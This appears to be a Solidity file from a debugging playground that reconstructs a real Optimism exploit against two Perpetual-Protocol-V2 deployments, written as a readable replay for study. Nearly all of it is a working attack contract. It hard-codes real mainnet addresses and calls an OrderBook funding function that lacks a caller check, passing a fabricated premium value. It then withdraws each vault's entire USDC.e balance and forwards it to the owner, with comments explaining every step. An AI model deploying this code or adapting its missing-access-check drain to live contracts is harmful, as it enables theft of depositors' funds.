// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Standalone synthetic exploit for the EVM Playground.
//
// The real incident tx (Optimism, block 154,311,432) is a single `CREATE` whose
// ENTIRE attack lives in the constructor of an unverified, unnamed init-code
// blob (the deployed runtime is a one-instruction `revert` stub) — there is no
// usable source map for it. This synthetic contract reconstructs the exact
// same call sequence as ordinary, readable Solidity calling the REAL, verified
// ClearingHouse / OrderBook / Vault contracts, so the debugger can show real
// source for every step.
//
// Root cause: OrderBook.updateFundingGrowthAndLiquidityCoefficientInFundingPayment()
// is missing the caller check every sibling privileged OrderBook function has
// (the reference implementation calls `_requireOnlyExchange()` here; both
// deployed OrderBook implementations hit by this incident omit it entirely).
// Per market: create a dust maker order, call the unguarded function directly
// with a fabricated twPremiumX96 ~= 1e70 (poisoning the order's cached funding
// checkpoint), then withdraw — which forces a re-settlement that diffs the
// real global funding growth against the poisoned checkpoint, inflating
// owedRealizedPnl enough to drain the vault's entire real USDC.e balance.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IClearingHouseLike {
    struct AddLiquidityParams {
        address baseToken;
        uint256 base;
        uint256 quote;
        int24 lowerTick;
        int24 upperTick;
        uint256 minBase;
        uint256 minQuote;
        bool useTakerBalance;
        uint256 deadline;
    }

    struct AddLiquidityResponse {
        uint256 base;
        uint256 quote;
        uint256 fee;
        uint256 liquidity;
    }

    function addLiquidity(AddLiquidityParams calldata params) external returns (AddLiquidityResponse memory);
}

interface IOrderBookLike {
    struct FundingGrowth {
        int256 twPremiumX96;
        int256 twPremiumDivBySqrtPriceX96;
    }

    // The vulnerable function: no caller restriction on the deployed contract,
    // even though its only intended caller is the market's Exchange contract.
    function updateFundingGrowthAndLiquidityCoefficientInFundingPayment(
        address trader,
        address baseToken,
        FundingGrowth memory fundingGrowthGlobal
    ) external returns (int256 liquidityCoefficientInFundingPayment);
}

interface IVaultLike {
    function withdraw(address token, uint256 amountX10_D) external;
}

/// @dev Deployed by the playground recorder; attack() is the recorded entrypoint.
contract PerpetualProtocolExploit {
    IERC20Like internal constant USDC = IERC20Like(0x7F5c764cBc14f9669B88837ca1490cCa17c31607); // USDC.e (Optimism)

    // Market #1
    address internal constant CLEARINGHOUSE_1 = 0x4f7961ee13bDA96BFa9381B87D21b2Baed96F0b5;
    address internal constant ORDERBOOK_1 = 0x772F48F073c1f328C264619fc3bbA28e3efdEfb0;
    address internal constant VAULT_1 = 0x28bB48207C761eeD2A4aA9249083c429c719AaDB;
    address internal constant VETH_1 = 0xab3F8a9599D62f09A71d7337dFfF4458a4C7fe27;

    // Market #2 (a separate, independently-deployed Perpetual-Protocol-V2 instance)
    address internal constant CLEARINGHOUSE_2 = 0x8098c6273bD5F9D32d03E6cb62472a9E6608efF2;
    address internal constant ORDERBOOK_2 = 0x4E26b6815d82BAa6B8c15Fe4ffB646dFb4b474c7;
    address internal constant VAULT_2 = 0xf127fdb858F009938B4530aAC37E5Bc8e9a09C28;
    address internal constant VETH_2 = 0x28D8a1a6BDEAF9d42dA6A55da8a34710e3434B97;

    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    /// @notice Recorded attack entrypoint. Drains both Perpetual-Protocol-V2
    ///         deployments in sequence, mirroring the real transaction exactly.
    function attack() external {
        require(msg.sender == owner, "not owner");

        _drainMarket(CLEARINGHOUSE_1, ORDERBOOK_1, VAULT_1, VETH_1, 84120, 84240);
        _drainMarket(CLEARINGHOUSE_2, ORDERBOOK_2, VAULT_2, VETH_2, 83400, 83520);
    }

    /// @notice One market's drain sequence.
    function _drainMarket(
        address clearingHouse,
        address orderBook,
        address vault,
        address baseToken,
        int24 lowerTick,
        int24 upperTick
    ) internal {
        // Step 1: a dust maker order (base=2, quote=1 wei) so OrderBook has an
        // OpenOrder entry for THIS contract (the trader) to track — and poison.
        IClearingHouseLike(clearingHouse).addLiquidity(
            IClearingHouseLike.AddLiquidityParams({
                baseToken: baseToken,
                base: 2,
                quote: 1,
                lowerTick: lowerTick,
                upperTick: upperTick,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: 1784221639
            })
        );

        // Step 2: call the UNGUARDED function directly (the bug: the deployed
        // OrderBook is missing the "only Exchange" check every sibling
        // privileged function carries). Fabricate twPremiumX96 = 1e70 — about
        // 10^31x the real, oracle-derived value (~3.5e39 seen during Step 1's
        // legitimate funding settlement) — to permanently poison this order's
        // cached lastTwPremiumGrowthInsideX96 / lastTwPremiumGrowthBelowX96.
        IOrderBookLike(orderBook).updateFundingGrowthAndLiquidityCoefficientInFundingPayment(
            address(this),
            baseToken,
            IOrderBookLike.FundingGrowth({twPremiumX96: 10**70, twPremiumDivBySqrtPriceX96: 0})
        );

        // Step 3: withdraw the vault's ENTIRE real USDC.e balance. Vault.withdraw()
        // forces ClearingHouse.settleAllFunding() -> Exchange.settleFunding() ->
        // OrderBook...FundingPayment() AGAIN — this time with the real (small)
        // global funding growth, which is diffed against the poisoned checkpoint
        // and produces an astronomically large owedRealizedPnl that trivially
        // clears the free-collateral check for the full withdrawal.
        uint256 vaultBalance = USDC.balanceOf(vault);
        IVaultLike(vault).withdraw(address(USDC), vaultBalance);

        // Step 4: forward the drained USDC.e to the attacker EOA (mirrors the
        // real creation bytecode's trailing transfer(recipient, amount) call).
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}
